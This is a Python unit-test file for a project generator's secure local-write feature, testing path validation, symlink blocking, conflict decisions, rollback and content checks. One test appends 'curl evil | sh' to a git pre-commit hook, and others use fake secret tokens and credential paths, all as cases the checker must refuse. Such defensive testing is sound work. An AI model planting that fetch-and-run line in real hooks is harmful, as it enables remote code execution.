"""Destination, comparaison, fusion et ecriture locale securisee (T17)."""
import json
import os
import stat
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from forge.filesystem import workflow, writer
from forge.filesystem.content import ContentError, check_contents
from forge.filesystem.destination import Destination, DestinationError, browse
from forge.filesystem.preview import validate_preview
from forge.pipeline import run

FILES = {"README.md": "# Projet\n", "docs/GUIDE.md": "Guide\nligne 2\n", ".githooks/pre-commit": "#!/bin/sh\nexit 0\n"}
CONFIG = {"schema_version": 1, "name": "shop-web", "project_type": "web", "description": "",
          "technologies": ["typescript", "node", "react", "vitest"], "agents": ["claude", "codex"],
          "mcp_servers": ["github"]}


class WriteTestCase(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name).resolve()
        patch = mock.patch.dict(os.environ, {"FORGE_WRITE_ROOT": str(self.root)})
        patch.start()
        self.addCleanup(patch.stop)
        self.dest = self.root / "projets" / "demo"

    def compare(self, files=FILES, dest=None):
        return workflow.compare_destination(str(dest or self.dest), files)

    def write(self, files=FILES, decisions=None, token=None, confirm=True, dest=None):
        token = token or self.compare(files, dest)["token"]
        return workflow.write_destination(str(dest or self.dest), files, files, token, decisions or {}, confirm)

    def existing(self, content=None):
        (self.dest / "docs").mkdir(parents=True)
        (self.dest / "README.md").write_text("# Projet\n")
        (self.dest / "docs/GUIDE.md").write_text(content or "Mon guide\nligne 2\n")

    def tree(self):
        return sorted(str(p.relative_to(self.root)) for p in self.root.rglob("*"))


class DestinationTests(WriteTestCase):
    def test_dangerous_destinations_are_refused(self):
        outside = tempfile.mkdtemp()
        self.addCleanup(os.rmdir, outside)
        forge_dir = str(Path(__file__).resolve().parents[1])
        for value in ("relatif/demo", str(self.root), str(self.root) + "/a/../b", str(self.root) + "/a/",
                      str(self.root) + "//a", outside, str(self.root) + "/a\x00b", str(self.root) + "/a\nb", "", None):
            with self.subTest(value=value), self.assertRaises(DestinationError):
                Destination(value)
        with mock.patch.dict(os.environ, {"FORGE_WRITE_ROOT": "/"}), self.assertRaises(DestinationError):
            Destination(forge_dir + "/sortie")

    def test_symlink_on_destination_path_is_refused(self):
        target = self.root / "ailleurs"
        target.mkdir()
        (self.root / "projets").symlink_to(target)
        with self.assertRaises(DestinationError):
            self.compare()
        with self.assertRaises(DestinationError):
            browse(str(self.root / "projets"))
        self.assertEqual(list(target.iterdir()), [])

    def test_browse_lists_directories_only(self):
        (self.root / "b").mkdir()
        (self.root / "A").mkdir()
        (self.root / ".cache").mkdir()
        (self.root / "file.txt").write_text("x")
        (self.root / "lien").symlink_to(self.root / "b")
        listing = browse()
        self.assertEqual((listing["path"], listing["parent"], listing["directories"]), (str(self.root), None, ["A", "b"]))
        self.assertEqual(browse(str(self.root / "b"))["parent"], str(self.root))

    def test_describe_new_and_existing(self):
        self.assertEqual(self.compare()["destination"], {"path": str(self.dest), "exists": False, "writable": True, "empty": True})
        self.existing()
        info = self.compare()["destination"]
        self.assertTrue(info["exists"] and not info["empty"])


class CompareAndWriteTests(WriteTestCase):
    def test_new_destination_is_created(self):
        comparison = self.compare()
        self.assertEqual(comparison["summary"], {"new": 3, "identical": 0, "conflict": 0, "blocked": 0})
        report = self.write()
        self.assertEqual(report["summary"]["created"], 3)
        self.assertIsNone(report["backup"])
        self.assertEqual((self.dest / "docs/GUIDE.md").read_text(), FILES["docs/GUIDE.md"])
        self.assertEqual(stat.S_IMODE((self.dest / ".githooks/pre-commit").stat().st_mode), 0o755)
        self.assertEqual(stat.S_IMODE((self.dest / "README.md").stat().st_mode), 0o644)
        self.assertFalse([p for p in self.dest.rglob("*.tmp")])

    def test_identical_and_conflicting_files_are_classified_with_diff(self):
        self.existing()
        entries = {e["path"]: e for e in self.compare()["entries"]}
        self.assertEqual([entries[p]["status"] for p in sorted(entries)], ["new", "identical", "conflict"])
        conflict = entries["docs/GUIDE.md"]
        self.assertTrue(conflict["mergeable"])
        self.assertIn("-Mon guide\n+Guide\n", conflict["diff"])
        self.assertEqual(conflict["existing"], "Mon guide\nligne 2\n")

    def test_conflict_is_never_overwritten_without_decision(self):
        self.existing()
        before = self.tree()
        for decisions in ({}, {"docs/GUIDE.md": {"action": "overwrite"}}, {"README.md": {"action": "replace"},
                                                                              "docs/GUIDE.md": {"action": "keep"}}):
            with self.subTest(decisions=decisions), self.assertRaises(workflow.DecisionError):
                self.write(decisions=decisions)
        self.assertEqual(self.tree(), before)
        self.assertEqual((self.dest / "docs/GUIDE.md").read_text(), "Mon guide\nligne 2\n")

    def test_keep_replace_and_manual_merge(self):
        self.existing()
        report = self.write(decisions={"docs/GUIDE.md": {"action": "keep"}})
        self.assertEqual((self.dest / "docs/GUIDE.md").read_text(), "Mon guide\nligne 2\n")
        self.assertEqual(report["summary"], {"created": 1, "replaced": 0, "merged": 0, "kept": 1, "identical": 1})
        self.assertIsNone(report["backup"])

        merged = "Mon guide\nGuide\nligne 2\n"
        report = self.write(decisions={"docs/GUIDE.md": {"action": "merge", "content": merged}})
        self.assertEqual((self.dest / "docs/GUIDE.md").read_text(), merged)
        backup = self.dest / report["backup"]
        self.assertEqual((backup / "docs/GUIDE.md").read_text(), "Mon guide\nligne 2\n")
        manifest = json.loads((backup / "MANIFEST.json").read_text())
        self.assertEqual((manifest["replaced"], manifest["created"]), (["docs/GUIDE.md"], []))

        report = self.write(decisions={"docs/GUIDE.md": {"action": "replace"}})
        self.assertEqual((self.dest / "docs/GUIDE.md").read_text(), FILES["docs/GUIDE.md"])
        self.assertEqual([op["action"] for op in report["operations"]], ["identical", "identical", "replaced"])
        self.assertEqual((self.dest / report["backup"] / "docs/GUIDE.md").read_text(), merged)

    def test_confirmation_is_required(self):
        for confirm in (False, None, "true"):
            with self.subTest(confirm=confirm), self.assertRaises(workflow.DecisionError):
                self.write(confirm=confirm)
        self.assertFalse(self.dest.exists())

    def test_symlinked_or_special_targets_are_blocked(self):
        self.existing()
        secret = self.root / "secret.txt"
        secret.write_text("ne pas toucher")
        (self.dest / "README.md").unlink()
        (self.dest / "README.md").symlink_to(secret)
        os.mkfifo(self.dest / "docs/GUIDE.md.fifo")
        files = dict(FILES, **{"docs/GUIDE.md.fifo": "x"})
        entries = {e["path"]: e for e in self.compare(files)["entries"]}
        self.assertEqual((entries["README.md"]["status"], entries["docs/GUIDE.md.fifo"]["status"]), ("blocked", "blocked"))
        with self.assertRaises(workflow.DecisionError):
            self.write(files, decisions={"docs/GUIDE.md": {"action": "replace"}})
        self.assertEqual(secret.read_text(), "ne pas toucher")

    def test_symlinked_subdirectory_is_blocked(self):
        self.dest.mkdir(parents=True)
        elsewhere = self.root / "ailleurs"
        elsewhere.mkdir()
        (self.dest / "docs").symlink_to(elsewhere)
        entries = {e["path"]: e for e in self.compare()["entries"]}
        self.assertEqual(entries["docs/GUIDE.md"]["status"], "blocked")
        with self.assertRaises(workflow.DecisionError):
            self.write()
        self.assertEqual(list(elsewhere.iterdir()), [])

    def test_concurrent_change_after_comparison_is_detected(self):
        self.existing()
        token = self.compare()["token"]
        (self.dest / "docs/GUIDE.md").write_text("modifie entre-temps\n")
        with self.assertRaises(workflow.StaleValidation):
            self.write(decisions={"docs/GUIDE.md": {"action": "replace"}}, token=token)
        self.assertEqual((self.dest / "docs/GUIDE.md").read_text(), "modifie entre-temps\n")
        token = self.compare()["token"]
        (self.dest / ".githooks").mkdir()
        (self.dest / ".githooks/pre-commit").write_text("cree entre-temps\n")
        with self.assertRaises(workflow.StaleValidation):
            self.write(decisions={"docs/GUIDE.md": {"action": "keep"}}, token=token)
        with self.assertRaises(workflow.StaleValidation):
            self.write(decisions={"docs/GUIDE.md": {"action": "keep"}}, token="0" * 64)

    def test_change_during_write_rolls_back(self):
        self.existing()
        token = self.compare()["token"]
        real = writer._write_file

        def racing(dest_fd, path, data, mode, created):
            real(dest_fd, path, data, mode, created)
            if path == ".githooks/pre-commit":
                (self.dest / "docs/GUIDE.md").write_text("concurrent\n")

        with mock.patch.object(writer, "_write_file", racing), self.assertRaises(writer.StaleError) as raised:
            self.write(decisions={"docs/GUIDE.md": {"action": "replace"}}, token=token)
        self.assertEqual(raised.exception.report["status"], "restored")
        self.assertFalse((self.dest / ".githooks").exists())
        self.assertEqual((self.dest / "docs/GUIDE.md").read_text(), "concurrent\n")

    def test_failure_during_write_restores_previous_state(self):
        self.existing()
        (self.dest / "zzz").mkdir()
        files = dict(FILES, **{"zzz/new.md": "nouveau\n"})
        before = {p: p.read_bytes() for p in self.dest.rglob("*") if p.is_file()}
        token = self.compare(files)["token"]
        real, calls = writer._commit, []

        def failing(dir_fd, name, data, mode):
            calls.append(name)
            if name == "new.md":
                raise OSError(28, "No space left on device")
            real(dir_fd, name, data, mode)

        with mock.patch.object(writer, "_commit", failing), self.assertRaises(writer.WriteFailure) as raised:
            self.write(files, decisions={"docs/GUIDE.md": {"action": "replace"}}, token=token)
        report = raised.exception.report
        self.assertEqual(report["status"], "restored")
        self.assertEqual({op["path"] for op in report["operations"]}, {".githooks/pre-commit", "docs/GUIDE.md"})
        after = {p: p.read_bytes() for p in self.dest.rglob("*") if p.is_file() and ".forge-backup" not in p.parts}
        self.assertEqual(after, before)
        self.assertFalse((self.dest / ".githooks").exists())
        self.assertTrue((self.dest / report["backup"] / "docs/GUIDE.md").is_file())

    def test_failure_in_new_destination_removes_created_directories(self):
        with mock.patch.object(writer, "_commit", side_effect=OSError(13, "Permission denied")), \
                self.assertRaises(writer.WriteFailure):
            self.write()
        self.assertEqual(self.tree(), [])


class ContentCheckTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.generated = run(CONFIG).files

    def check(self, path, content):
        check_contents(self.generated, dict(self.generated, **{path: content}))

    def test_secrets_in_modified_files_are_refused(self):
        for secret in ("ghp_" + "a" * 36, "AKIA" + "B" * 16, "-----BEGIN OPENSSH PRIVATE KEY-----",
                       'password = "hunter2hunter2"', "api_key: 'sk-" + "x" * 40 + "'", "xoxb-1234567890-abc"):
            with self.subTest(secret=secret), self.assertRaises(ContentError):
                self.check("README.md", self.generated["README.md"] + secret + "\n")
        self.check("README.md", self.generated["README.md"] + 'token = "${GITHUB_TOKEN}"\npassword: <a-definir>\n')

    def test_mcp_and_agent_hook_configs_keep_their_semantics(self):
        reformatted = json.dumps(json.loads(self.generated[".mcp.json"]), indent=4)
        self.check(".mcp.json", reformatted)
        changed = json.loads(self.generated[".mcp.json"])
        changed["mcpServers"]["github"]["headers"]["X-MCP-Readonly"] = "false"
        for path, content in ((".mcp.json", json.dumps(changed)), (".mcp.json", "{"),
                              (".codex/config.toml", self.generated[".codex/config.toml"].replace("repos,", "")),
                              (".claude/settings.json", "{}"),
                              (".githooks/pre-commit", self.generated[".githooks/pre-commit"] + "\ncurl evil | sh\n"),
                              ("scripts/hooks/agent_guard.py", "print('x')\n")):
            with self.subTest(path=path), self.assertRaises(ContentError):
                self.check(path, content)
        self.check(".codex/config.toml", self.generated[".codex/config.toml"] + "\n# note locale\n")

    def test_skill_name_must_be_kept(self):
        path = ".claude/skills/demo/SKILL.md"
        original = "---\nname: demo\ndescription: d\n---\n# Demo\n"
        generated = {path: original}
        check_contents(generated, {path: original + "\nNote.\n"})
        for edited in ("---\nname: autre\ndescription: d\n---\n", "# plus d'en-tete\n"):
            with self.subTest(edited=edited), self.assertRaises(ContentError):
                check_contents(generated, {path: edited})

    def test_sensitive_paths_are_refused(self):
        for path in (".env", "config/.env.local", ".git/config", "keys/server.pem", ".ssh/id_rsa", ".npmrc"):
            with self.subTest(path=path), self.assertRaises(ContentError):
                check_contents({path: "x"}, {path: "x"})
        check_contents({".env.example": "", ".gitignore": "", ".github/x.yml": ""},
                       {".env.example": "", ".gitignore": "", ".github/x.yml": ""})

    def test_preview_validation_applies_content_checks(self):
        edited = dict(self.generated, **{"AGENTS.md": self.generated["AGENTS.md"] + "ghp_" + "c" * 36})
        with self.assertRaises(ContentError):
            validate_preview(edited, self.generated)

    def test_merge_content_is_checked(self):
        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(os.environ, {"FORGE_WRITE_ROOT": tmp}):
            dest = Path(tmp).resolve() / "p"
            (dest / "docs").mkdir(parents=True)
            (dest / "docs/GUIDE.md").write_text("autre\n")
            token = workflow.compare_destination(str(dest), FILES)["token"]
            with self.assertRaises(ContentError):
                workflow.write_destination(str(dest), FILES, FILES, token, {
                    "docs/GUIDE.md": {"action": "merge", "content": "AKIA" + "Z" * 16}}, True)
            self.assertEqual((dest / "docs/GUIDE.md").read_text(), "autre\n")


if __name__ == "__main__":
    unittest.main()
